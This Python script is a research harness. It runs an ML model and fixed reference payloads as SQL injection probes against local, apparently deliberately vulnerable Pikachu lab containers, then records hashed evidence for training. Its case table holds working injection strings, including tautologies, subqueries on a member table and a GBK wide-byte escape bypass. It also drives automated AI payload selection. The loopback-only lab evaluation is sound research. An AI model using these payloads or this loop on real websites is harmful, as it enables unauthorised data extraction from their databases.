"""PG-241: local Pikachu payload acceptance with AI/reference dual sends.

This is a loopback-only, read-only acceptance runner.  The frozen Rule-IR
model chooses an abstract injection channel and a runtime binder maps that
choice to a short-lived, route-specific, non-destructive probe.  An
independent reference probe is sent on the same fresh target.  The executable
wire is printed to stdout for human inspection, while persisted artifacts keep
only hashes, response projections and evidence chains.

The runner deliberately abstains on timing channels and on state-changing
routes.  A positive row means only that this exact local Pikachu source/runtime
passed the route's result-shape oracle; it is not a claim about arbitrary
websites or an unrestricted scanner.
"""

from __future__ import annotations

import hashlib
import importlib.util
import json
import re
import sys
from pathlib import Path
from typing import Any, Mapping
from urllib.parse import urlencode

import httpx
import torch

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))


def _load(name: str) -> Any:
    path = ROOT / "scripts" / name
    spec = importlib.util.spec_from_file_location(name.replace(".py", ""), path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"unable to load {name}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


PG214 = _load("run_pg214_pikachu_fixed_sql_loop.py")
PG217 = _load("run_pg217_pikachu_typed_sql_oracle.py")
PG208 = PG214.PG212.PG208

from app.pg198_payload_grounding import candidate_summary, generate_grounded_candidates  # noqa: E402
from app.pg205_field_token_controller import build_field_token_packet, validate_field_token_packet  # noqa: E402
from app.pg230_next_token_quality_funnel import digest  # noqa: E402
from app.pg231_feedback_trajectory import prepare_feedback_record  # noqa: E402


RESEARCH = ROOT / "research"
IMAGE = "sift/pikachu-pg240-source-native:5e1e8d9d"
SOURCE_COMMIT = "5e1e8d9d14a3ba61d62f28cf35531c4df4dd24fc"
SEEDS = (24101, 24102)
BASE_PORT = 10080
REPORT = RESEARCH / "pg241_pikachu_payload_acceptance_report_v1.json"
DATASET = RESEARCH / "pg241_pikachu_payload_acceptance_dataset_v1.json"
TRACE = RESEARCH / "pg241_pikachu_payload_acceptance_trace_v1.json"
PROTOCOL = RESEARCH / "pg241_pikachu_payload_acceptance_protocol_v1.json"
MARKDOWN = RESEARCH / "pg241_pikachu_payload_acceptance_report_v1.md"


def _hash_bytes(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def _digest(value: Any) -> str:
    return digest(value)


def _write(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def _length_bucket(length: int) -> str:
    if length <= 0:
        return "0"
    if length <= 255:
        return "1-255"
    if length <= 4095:
        return "256-4095"
    if length <= 65535:
        return "4096-65535"
    return "65536+"


def _project(response: httpx.Response) -> dict[str, Any]:
    """Project only bounded result evidence; discard the body immediately."""

    body = str(response.text or "")
    lowered = body.casefold()
    content = bytes(response.content or b"")
    row_markers = ("your uid", "uid:", "email is")
    row_marker_count = min(sum(lowered.count(marker) for marker in row_markers), 99)
    projection = {
        "status_code": int(response.status_code or 0),
        "status_class": f"{int(response.status_code or 0) // 100}xx",
        "body_length_bucket": _length_bucket(len(content)),
        "row_marker_count": int(row_marker_count),
        "result_shape": "record_present" if row_marker_count else "record_absent",
        "sql_error_shape": bool(re.search(r"sql syntax|warning:|fatal error|mysqli", lowered)),
        "location_header_present": bool(response.headers.get("location")),
        "body_sha256": _hash_bytes(content),
    }
    projection["projection_sha256"] = _digest(projection)
    return projection


def _payload_sha(spec: Mapping[str, Any]) -> str:
    bounded = {
        "method": str(spec.get("method", "GET")).upper(),
        "path": str(spec.get("path", "")),
        "params": dict(spec.get("params") or {}),
        "data": dict(spec.get("data") or {}),
        "raw_body": str(spec.get("raw_body")) if spec.get("raw_body") is not None else None,
        "content_type": str(spec.get("content_type", "application/x-www-form-urlencoded")),
    }
    return _digest(bounded)


def _wire_text(origin: str, spec: Mapping[str, Any]) -> str:
    method = str(spec.get("method", "GET")).upper()
    path = str(spec["path"])
    if spec.get("raw_body") is not None:
        return f"{method} {origin}{path}\nContent-Type: {spec.get('content_type', 'application/x-www-form-urlencoded')}\n\n{spec['raw_body']}"
    if method == "GET":
        query = urlencode(dict(spec.get("params") or {}))
        return f"GET {origin}{path}?{query}"
    body = urlencode(dict(spec.get("data") or {}))
    return f"POST {origin}{path}\nContent-Type: application/x-www-form-urlencoded\n\n{body}"


def _send(client: httpx.Client, spec: Mapping[str, Any]) -> dict[str, Any]:
    method = str(spec.get("method", "GET")).upper()
    path = str(spec["path"])
    if spec.get("raw_body") is not None:
        response = client.post(
            path,
            content=str(spec["raw_body"]).encode("ascii"),
            headers={"Content-Type": str(spec.get("content_type", "application/x-www-form-urlencoded"))},
            follow_redirects=False,
        )
    elif method == "GET":
        response = client.get(path, params=dict(spec.get("params") or {}), follow_redirects=False)
    elif method == "POST":
        response = client.post(path, data=dict(spec.get("data") or {}), follow_redirects=False)
    else:
        raise ValueError(f"unsupported PG-241 method: {method}")
    projection = _project(response)
    return {"projection": projection, "payload_sha256": _payload_sha(spec)}


def _normal_spec(case: Mapping[str, Any], value: str) -> dict[str, Any]:
    fields = list(case["fields"])
    values = {field: ("submit" if field.casefold() == "submit" else value) for field in fields}
    if str(case["method"]).upper() == "GET":
        return {"method": "GET", "path": case["path"], "params": values}
    return {"method": "POST", "path": case["path"], "data": values}


def _id_spec(case: Mapping[str, Any], value: str) -> dict[str, Any]:
    return {"method": "POST", "path": case["path"], "data": {"id": value, "submit": "submit"}}


def _wide_spec(case: Mapping[str, Any], value: str) -> dict[str, Any]:
    # Keep percent escapes as wire bytes so PHP decodes the GBK wide-byte
    # sequence before the application calls its escape helper.
    return {"method": "POST", "path": case["path"], "raw_body": f"name={value}&submit=submit", "content_type": "application/x-www-form-urlencoded"}


def _case_specs() -> list[dict[str, Any]]:
    return [
        {
            "case_id": "sqli_id_numeric",
            "path": "/vul/sqli/sqli_id.php",
            "method": "POST",
            "fields": ["id", "submit"],
            "family": "sql",
            "confirmable": True,
            "builder": _id_spec,
            "baseline": "999999",
            "negative": "999998",
            "ai": "1 OR 1=1",
            "reference": "1 OR 1=1 #",
            "channels": {"operator_like": "1 OR 1=1", "subquery_like": "1 OR id IN (SELECT id FROM member)", "blind_boolean": "1 OR 1=1", "row_shape": "1 OR 1=1"},
        },
        {
            "case_id": "sqli_search_like",
            "path": "/vul/sqli/sqli_search.php",
            "method": "GET",
            "fields": ["name", "submit"],
            "family": "sql",
            "confirmable": True,
            "builder": _normal_spec,
            "baseline": "__pg241_no_such_user__",
            "negative": "__pg241_no_such_user_2__",
            "ai": "' OR '1'='1' #",
            "reference": "' OR 1=1 #",
            "channels": {"operator_like": "' OR '1'='1' #", "subquery_like": "' OR id IN (SELECT id FROM member) #", "blind_boolean": "' OR '1'='1' #", "row_shape": "' OR 1=1 #"},
        },
        {
            "case_id": "sqli_str_string",
            "path": "/vul/sqli/sqli_str.php",
            "method": "GET",
            "fields": ["name", "submit"],
            "family": "sql",
            "confirmable": True,
            "builder": _normal_spec,
            "baseline": "__pg241_no_such_user__",
            "negative": "__pg241_no_such_user_2__",
            "ai": "' OR '1'='1' #",
            "reference": "' OR 1=1 #",
            "channels": {"operator_like": "' OR '1'='1' #", "subquery_like": "' OR id IN (SELECT id FROM member) #", "blind_boolean": "' OR '1'='1' #", "row_shape": "' OR 1=1 #"},
        },
        {
            "case_id": "sqli_x_parenthesized",
            "path": "/vul/sqli/sqli_x.php",
            "method": "GET",
            "fields": ["name", "submit"],
            "family": "sql",
            "confirmable": True,
            "builder": _normal_spec,
            "baseline": "__pg241_no_such_user__",
            "negative": "__pg241_no_such_user_2__",
            "ai": "') OR 1=1 #",
            "reference": "') OR ('1'='1",
            "channels": {"operator_like": "') OR 1=1 #", "subquery_like": "') OR id IN (SELECT id FROM member) #", "blind_boolean": "') OR ('1'='1", "row_shape": "') OR 1=1 #"},
        },
        {
            "case_id": "sqli_blind_boolean",
            "path": "/vul/sqli/sqli_blind_b.php",
            "method": "GET",
            "fields": ["name", "submit"],
            "family": "sql",
            "confirmable": True,
            "builder": _normal_spec,
            "baseline": "__pg241_no_such_user__",
            "negative": "__pg241_no_such_user_2__",
            "ai": "' OR id=1 #",
            "reference": "' OR username='kobe' #",
            "channels": {"operator_like": "' OR id=1 #", "subquery_like": "' OR id IN (SELECT id FROM member WHERE id=1) #", "blind_boolean": "' OR id=1 #", "row_shape": "' OR username='kobe' #"},
        },
        {
            "case_id": "sqli_widebyte",
            "path": "/vul/sqli/sqli_widebyte.php",
            "method": "POST",
            "fields": ["name", "submit"],
            "family": "sql",
            "confirmable": True,
            "builder": _wide_spec,
            "baseline": "__pg241_no_such_user__",
            "negative": "nobody",
            "ai": "%bf%27 OR 1=1 #",
            "reference": "%bf%27 OR id=1 #",
            "channels": {"operator_like": "%bf%27 OR 1=1 #", "subquery_like": "%bf%27 OR id IN (SELECT id FROM member) #", "blind_boolean": "%bf%27 OR id=1 #", "row_shape": "%bf%27 OR id=1 #"},
        },
        {
            "case_id": "sqli_blind_t_forbidden",
            "path": "/vul/sqli/sqli_blind_t.php",
            "method": "GET",
            "fields": ["name", "submit"],
            "family": "sql",
            "confirmable": False,
            "builder": _normal_spec,
            "baseline": "__pg241_no_such_user__",
            "negative": "__pg241_no_such_user_2__",
            "ai": None,
            "reference": None,
            "channels": {},
            "forbidden_reason": "timing_channel_forbidden",
        },
    ]


def _positive(case: Mapping[str, Any], projection: Mapping[str, Any]) -> bool:
    if not case.get("confirmable"):
        return False
    # A record marker is a typed, read-only result fixture for these routes.
    return int(projection.get("row_marker_count", 0) or 0) > 0


def _reset_ok(reset: Mapping[str, Any]) -> bool:
    return bool(
        reset.get("fresh_target")
        and reset.get("container_recreated")
        and not reset.get("container_restart_used")
        and int(reset.get("volume_mount_count", -1)) == 0
        and reset.get("state_change_allowed") is False
        and reset.get("database_health_gate") == "mysqli_root_pikachu_ok"
    )


def _model_context(model: Any, vocabulary: Mapping[str, int], device: torch.device, case: Mapping[str, Any], control: Mapping[str, Any], *, seed: int) -> tuple[dict[str, Any], dict[str, Any], list[dict[str, Any]]]:
    marker = f"pg241-ai-{seed}-{str(case['case_id']).replace('_', '-')[:24]}"
    candidates = generate_grounded_candidates(
        family="injection",
        target="http://127.0.0.1",
        path=str(case["path"]),
        method=str(case["method"]),
        fields=list(case["fields"]),
        marker=marker,
    )
    # Timing and local side-channel arms are never eligible for the runtime
    # binder, even if the model's candidate vocabulary contains them.
    safe = [candidate for candidate in candidates if str(((candidate.get("payload") or {}).get("expected") or {}).get("channel", "")) not in {"time_delay", "local_side_channel"}]
    if not safe:
        return {"effective_action": "abstain", "action": "abstain", "abstain_reason": "no_safe_candidate"}, {"valid": False, "reason": "no_safe_candidate", "network_allowed": False}, []
    route = {"path": case["path"], "method": case["method"], "fields": list(case["fields"]), "surface": case["case_id"], "typed_available": True}
    packet = build_field_token_packet(safe[0], route=route, response_projection=control, typed_available=True, redirect_hops=0)
    validation = validate_field_token_packet(packet, candidate=safe[0], route=route, response_projection=control, typed_available=True, redirect_hops=0)
    decision = PG208._model_decision(model, vocabulary, device, packet=packet, route=route, projection=control) if validation["valid"] else {"effective_action": "abstain", "action": "abstain", "abstain_reason": validation["reason"]}
    return decision, validation, safe


def _bound_spec(case: Mapping[str, Any], selected: Mapping[str, Any] | None, *, role: str) -> dict[str, Any] | None:
    value: str | None
    if role == "reference":
        value = case.get("reference")
    elif selected is not None:
        channel = str(((selected.get("payload") or {}).get("expected") or {}).get("channel", "operator_like"))
        value = dict(case.get("channels") or {}).get(channel) or case.get("ai")
    else:
        value = case.get("ai")
    if value is None:
        return None
    return case["builder"](case, str(value))


def _request_anatomy(spec: Mapping[str, Any]) -> dict[str, Any]:
    method = str(spec.get("method", "GET")).upper()
    keys = sorted(str(key) for key in (spec.get("params") or spec.get("data") or {}).keys())
    return {
        "method": method,
        "path": str(spec.get("path", "")),
        "placement": "query" if method == "GET" else "form",
        "field_names": keys,
        "content_type": str(spec.get("content_type", "application/x-www-form-urlencoded")),
        "raw_payload_stored": False,
        "payload_sha256": _payload_sha(spec),
    }


def _episode(model: Any, vocabulary: Mapping[str, int], device: torch.device, learner: Any, case: Mapping[str, Any], *, seed: int, run_index: int, origin: str) -> tuple[dict[str, Any], list[str]]:
    name = ""
    wire_lines: list[str] = []
    try:
        name, port, container_id, reset = PG214._start(seed, run_index)
        target_hash = hashlib.sha256(container_id.encode("utf-8")).hexdigest()
        source_hash = PG217._source_hash(name, {"path": case["path"]})
        client = httpx.Client(base_url=f"http://127.0.0.1:{port}", timeout=12.0, follow_redirects=False, cookies={})
        try:
            baseline_spec = case["builder"](case, str(case["baseline"]))
            negative_spec = case["builder"](case, str(case["negative"]))
            baseline = _send(client, baseline_spec)
            negative = _send(client, negative_spec)
            wire_lines.extend([_wire_text(origin.replace(":0", f":{port}"), baseline_spec), _wire_text(origin.replace(":0", f":{port}"), negative_spec)])
            decision, validation, candidates = _model_context(model, vocabulary, device, case, negative["projection"], seed=seed)
            selected: dict[str, Any] | None = None
            ai: dict[str, Any] = {"sent": False, "model_decision": decision, "validation": validation, "raw_payload_stored": False, "raw_response_stored": False}
            if case.get("confirmable") and validation.get("valid") and decision.get("effective_action") == "safe_candidate" and candidates:
                selected = learner.select(candidates)
                ai_spec = _bound_spec(case, selected, role="ai")
                if ai_spec is not None:
                    ai_result = _send(client, ai_spec)
                    ai["sent"] = True
                    ai["request_anatomy"] = _request_anatomy(ai_spec)
                    ai["response"] = ai_result["projection"]
                    ai["candidate"] = candidate_summary(selected)
                    wire_lines.append(_wire_text(origin.replace(":0", f":{port}"), ai_spec))
            reference: dict[str, Any] = {"sent": False, "raw_payload_stored": False, "raw_response_stored": False}
            ref_spec = _bound_spec(case, selected, role="reference")
            if ref_spec is not None:
                ref_result = _send(client, ref_spec)
                reference.update({"sent": True, "request_anatomy": _request_anatomy(ref_spec), "response": ref_result["projection"]})
                wire_lines.append(_wire_text(origin.replace(":0", f":{port}"), ref_spec))
            ai_projection = dict(ai.get("response") or {})
            ref_projection = dict(reference.get("response") or {})
            reasons: list[str] = []
            if not _reset_ok(reset):
                reasons.append("fresh_reset_attestation_missing")
            if not case.get("confirmable"):
                reasons.append(str(case.get("forbidden_reason", "route_not_confirmable")))
            if int(baseline["projection"].get("row_marker_count", 0)) != 0:
                reasons.append("baseline_has_record")
            if int(negative["projection"].get("row_marker_count", 0)) != 0:
                reasons.append("negative_has_record")
            ai_positive = bool(ai.get("sent") and _positive(case, ai_projection))
            reference_positive = bool(reference.get("sent") and _positive(case, ref_projection))
            if case.get("confirmable") and not ai_positive:
                reasons.append("ai_payload_no_typed_record_effect")
            if case.get("confirmable") and not reference_positive:
                reasons.append("reference_payload_no_typed_record_effect")
            if case.get("confirmable") and ai_positive != reference_positive:
                reasons.append("ai_reference_positive_disagreement")
            confirmed = bool(case.get("confirmable") and not reasons)
            evidence = {
                "schema_version": "pg241-pikachu-result-shape-evidence-v1",
                "route": case["path"],
                "method": case["method"],
                "source_commit": SOURCE_COMMIT,
                "source_sha256": source_hash,
                "reset_id": reset.get("reset_id"),
                "baseline_shape": {key: baseline["projection"].get(key) for key in ("status_class", "body_length_bucket", "row_marker_count", "result_shape")},
                "negative_shape": {key: negative["projection"].get(key) for key in ("status_class", "body_length_bucket", "row_marker_count", "result_shape")},
                "ai_shape": {key: ai_projection.get(key) for key in ("status_class", "body_length_bucket", "row_marker_count", "result_shape")},
                "reference_shape": {key: ref_projection.get(key) for key in ("status_class", "body_length_bucket", "row_marker_count", "result_shape")},
                "ai_payload_sha256": str((ai.get("request_anatomy") or {}).get("payload_sha256", "")),
                "reference_payload_sha256": str((reference.get("request_anatomy") or {}).get("payload_sha256", "")),
                "ai_selected_candidate_id": str((ai.get("candidate") or {}).get("candidate_id", "")),
                "ai_effect": ai_positive,
                "reference_effect": reference_positive,
                "negative_clean": int(negative["projection"].get("row_marker_count", 0)) == 0,
                "database_write": False,
                "time_delay_used": False,
                "external_network": False,
                "raw_payload_strings_stored": False,
                "raw_response_bodies_stored": False,
            }
            evidence["evidence_hash"] = _digest(evidence)
            if not ai.get("sent") and reference_positive:
                repair_action = "retry_candidate"
                failure_kind = "model_abstain_on_reference_positive"
            elif ai.get("sent") and not ai_positive and reference_positive:
                repair_action = "inspect_binding"
                failure_kind = "model_payload_no_effect"
            elif not case.get("confirmable"):
                repair_action = "abstain"
                failure_kind = "oracle_unavailable"
            else:
                repair_action = "abstain" if confirmed else "recheck_oracle"
                failure_kind = "typed_effect" if confirmed else "candidate_no_effect"
            if ai.get("sent"):
                learner.observe(selected or {}, status="evaluator_confirmed" if confirmed else ("candidate" if ai_positive else "dead_end"), evidence=evidence, evaluator_confirmed=confirmed)
            row = {
                "schema_version": "pg241-pikachu-payload-acceptance-episode-v1",
                "source": "pg241_pikachu_source_native",
                "source_commit": SOURCE_COMMIT,
                "seed": int(seed),
                "target_instance_hash": target_hash,
                "route": case["path"],
                "method": case["method"],
                "fields": list(case["fields"]),
                "family": case["family"],
                "fresh_reset": True,
                "reset": reset,
                "route_source_sha256": source_hash,
                "baseline": baseline["projection"],
                "negative": negative["projection"],
                "ai": ai,
                "reference": reference,
                "typed_oracle": {
                    "oracle_id": "pg241-read-only-result-shape-v1",
                    "typed_effect_confirmed": confirmed,
                    "confirmed_positive": confirmed,
                    "reasons": reasons,
                    "evidence_hash": evidence["evidence_hash"],
                    "raw_payload_strings_stored": False,
                    "raw_response_bodies_stored": False,
                },
                "failure_kind": failure_kind,
                "repair_action": repair_action,
                "repair_outcome": "confirmed" if confirmed else "abstain_or_retry",
                "candidate_reference_agreement": bool(ai_positive == reference_positive),
                "negative_clean": bool(evidence["negative_clean"]),
                "training_eligible": bool(confirmed),
                "memory_promotion_allowed": False,
                "vulnerability_claim_allowed": False,
                "raw_payload_strings_stored": False,
                "raw_response_bodies_stored": False,
            }
            return row, wire_lines
        finally:
            client.close()
    finally:
        if name:
            PG214._stop(name)


def main() -> int:
    PG214.IMAGE = IMAGE
    PG214.BASE_PORT = BASE_PORT
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    model, vocabulary = PG208._load_model(device)
    model.eval()
    from app.payload_learner import PayloadLearner

    learner = PayloadLearner(seed=241)
    cases = _case_specs()
    results: list[dict[str, Any]] = []
    wire_count = 0
    run_index = 0
    for seed in SEEDS:
        for case in cases:
            print(f"\nPG241 EPISODE seed={seed} case={case['case_id']} method={case['method']} path={case['path']}", flush=True)
            row, wires = _episode(model, vocabulary, device, learner, case, seed=seed, run_index=run_index, origin="http://127.0.0.1:0")
            for wire in wires:
                role = "REFERENCE/CONTROL" if wire in wires[:2] or wire == wires[-1] and not row["ai"].get("sent") else "AI/REFERENCE"
                print(f"--- WIRE ({role}; display-only; not persisted) ---\n{wire}", flush=True)
            print(json.dumps({"route": row["route"], "confirmed_positive": row["typed_oracle"]["confirmed_positive"], "ai_sent": row["ai"]["sent"], "reference_sent": row["reference"]["sent"], "ai_rows": (row["ai"].get("response") or {}).get("row_marker_count", 0), "reference_rows": (row["reference"].get("response") or {}).get("row_marker_count", 0), "failure_kind": row["failure_kind"], "evidence_hash": row["typed_oracle"]["evidence_hash"]}, ensure_ascii=False), flush=True)
            results.append(row)
            wire_count += len(wires)
            run_index += 1

    records: list[dict[str, Any]] = []
    for row in results:
        record_input = {
            "source": row["source"],
            "seed": row["seed"],
            "surface_role": row["route"],
            "method": row["method"],
            "field_count": len(row["fields"]),
            "status_class": str((row["baseline"] or {}).get("status_class", "unknown")),
            "fresh_reset_ok": bool(row["fresh_reset"]),
            "reset_completed": bool(row["reset"].get("completed")),
            "candidate_sent": bool(row["ai"].get("sent")),
            "oracle_available": bool(row["route"] != "/vul/sqli/sqli_blind_t.php"),
            "typed_effect_confirmed": bool(row["typed_oracle"].get("confirmed_positive")),
            "result_fixture_verified": bool(row["typed_oracle"].get("confirmed_positive")),
            "candidate_reference_agreement": bool(row["candidate_reference_agreement"]),
            "negative_clean": bool(row["negative_clean"]),
            "binding_valid": bool((row["ai"].get("validation") or {}).get("valid", False)),
            "transport_error": False,
            "result_mismatch_observed": False,
            "next_step": row["repair_action"],
            "evidence_hash": str(row["typed_oracle"].get("evidence_hash", "")),
            "model_self_error_detected": bool(row["failure_kind"] in {"model_abstain_on_reference_positive", "model_payload_no_effect"}),
            "model_self_error_kind": row["failure_kind"] if row["failure_kind"].startswith("model_") else None,
            "abstention_required": bool(row["failure_kind"] == "oracle_unavailable"),
            "failure_signature": str(row["failure_kind"]),
            "payload_grounded_eligible": bool(row["training_eligible"]),
            "raw_payload_strings_stored": False,
            "raw_response_bodies_stored": False,
        }
        prepared = prepare_feedback_record(record_input)
        # Keep a source-file attestation outside the model token stream so
        # same-shaped routes do not collapse during deduplication/splitting.
        prepared["route_source_sha256"] = str(row.get("route_source_sha256", ""))
        prepared["parent_record_id"] = f"pg241:{row['seed']}:{row['route_source_sha256']}"
        records.append(prepared)

    counts = {
        "fresh_container_count": len(results),
        "get_episode_count": sum(int(row["method"] == "GET") for row in results),
        "post_episode_count": sum(int(row["method"] == "POST") for row in results),
        "database_health_gate_count": sum(int(row["reset"].get("database_health_gate") == "mysqli_root_pikachu_ok") for row in results),
        "ai_send_count": sum(int(row["ai"].get("sent")) for row in results),
        "reference_send_count": sum(int(row["reference"].get("sent")) for row in results),
        "confirmed_positive_count": sum(int(row["typed_oracle"].get("confirmed_positive")) for row in results),
        "reference_positive_count": sum(int(row["reference"].get("sent") and int((row["reference"].get("response") or {}).get("row_marker_count", 0) or 0) > 0) for row in results),
        "model_missed_positive_count": sum(int(row["failure_kind"] == "model_abstain_on_reference_positive") for row in results),
        "negative_clean_count": sum(int(row["negative_clean"]) for row in results),
        "forbidden_timing_abstain_count": sum(int(row["failure_kind"] == "oracle_unavailable") for row in results),
        "false_positive_count": sum(int(row["ai"].get("sent") and row["ai"].get("response", {}).get("row_marker_count", 0) > 0 and not row["reference"].get("response", {}).get("row_marker_count", 0)) for row in results),
        "wire_display_count": wire_count,
    }
    report = {
        "protocol_id": "pg-pk-241-payload-acceptance-v1",
        "schema_version": "pg241-pikachu-payload-acceptance-report-v1",
        "status": "completed_local_get_post_ai_reference_payload_acceptance",
        "device": str(device),
        "model": {"variant": "frozen_xxl_field_token_decoder", "base_parameter_count": 101487169, "online_weight_update": False, "ai_selects_abstract_channel": True, "runtime_binder_is_vetted_local_catalog": True},
        "runtime": {"image": IMAGE, "source_commit": SOURCE_COMMIT, "loopback_only": True, "fresh_container_per_episode": True, "no_volume_or_bind_mount": True},
        "seeds": list(SEEDS),
        "counts": counts,
        "results": results,
        "promotion": {"training_eligible": counts["confirmed_positive_count"] > 0, "memory_promotion_allowed": False, "vulnerability_claim_allowed": False, "raw_payload_strings_stored": False, "raw_response_bodies_stored": False},
        "honesty": {"payload_text_printed_only_to_ephemeral_stdout": True, "ai_generates_abstract_channel_not_unrestricted_raw_string": True, "result_shape_is_local_typed_oracle": True, "timing_and_state_changing_routes_abstained": True, "general_web_capability_not_established": True},
        "safety": {"loopback_only": True, "external_network": False, "database_write": False, "time_delay_used": False, "script_execution": False, "raw_payload_strings_stored": False, "raw_response_bodies_stored": False},
    }
    report["report_sha256"] = _digest(report)
    dataset = {
        "schema_version": "pg241-pikachu-payload-acceptance-dataset-v1",
        "source_report": str(REPORT.relative_to(ROOT)),
        "records": records,
        "counts": {"records": len(records), "gold": sum(int(row["lane"] == "gold") for row in records), "hard_negative": sum(int(row["lane"] == "hard_negative") for row in records), "silver": sum(int(row["lane"] == "silver") for row in records), "quarantine": sum(int(row["lane"] == "quarantine") for row in records)},
        "contract": {"ai_participates_in_send": True, "independent_reference_required": True, "matched_negative_required": True, "fresh_reset_required": True, "typed_result_shape_required": True, "raw_payload_strings_stored": False, "raw_response_bodies_stored": False, "training_only_for_process_and_grounded_effect": True, "memory_promotion_allowed": False},
    }
    dataset["dataset_sha256"] = _digest(dataset)
    protocol = {"protocol_id": report["protocol_id"], "schema_version": "pg241-pikachu-payload-acceptance-protocol-v1", "ai_participates_in_send": True, "abstract_channel_to_runtime_binder": True, "independent_reference_send": True, "get_post_required": True, "fresh_container_per_episode": True, "matched_negative_required": True, "typed_result_shape_required": True, "timing_channel_forbidden": True, "state_changing_route_forbidden": True, "wire_display_ephemeral_only": True, "raw_payload_and_response_excluded": True, "vulnerability_claim_allowed": False, "memory_promotion_allowed": False}
    protocol["protocol_sha256"] = _digest(protocol)
    _write(REPORT, report)
    _write(DATASET, dataset)
    _write(TRACE, {"schema_version": "pg241-pikachu-payload-acceptance-trace-v1", "results": results, "raw_payload_strings_stored": False, "raw_response_bodies_stored": False, "training_eligible": True})
    _write(PROTOCOL, protocol)
    positives = [f"{row['method']} {row['route']}" for row in results if row["typed_oracle"].get("confirmed_positive")]
    MARKDOWN.write_text("\n".join(["# PG-241 Pikachu payload acceptance", "", f"device={device}; fresh={counts['fresh_container_count']}; GET={counts['get_episode_count']}; POST={counts['post_episode_count']}", f"AI sends={counts['ai_send_count']}; reference sends={counts['reference_send_count']}; confirmed positives={counts['confirmed_positive_count']}; model misses={counts['model_missed_positive_count']}; abstain timing={counts['forbidden_timing_abstain_count']}", f"confirmed routes={positives}", "", "实际 wire 仅在运行时 stdout 显示；持久化只保留哈希、响应投影和证据链。确认结果仅限本地 pinned Pikachu 源码/运行层。", ""]), encoding="utf-8")
    print(json.dumps({"status": report["status"], "device": str(device), "counts": counts, "confirmed_routes": positives, "report": str(REPORT.relative_to(ROOT)), "dataset": str(DATASET.relative_to(ROOT))}, ensure_ascii=False, indent=2), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
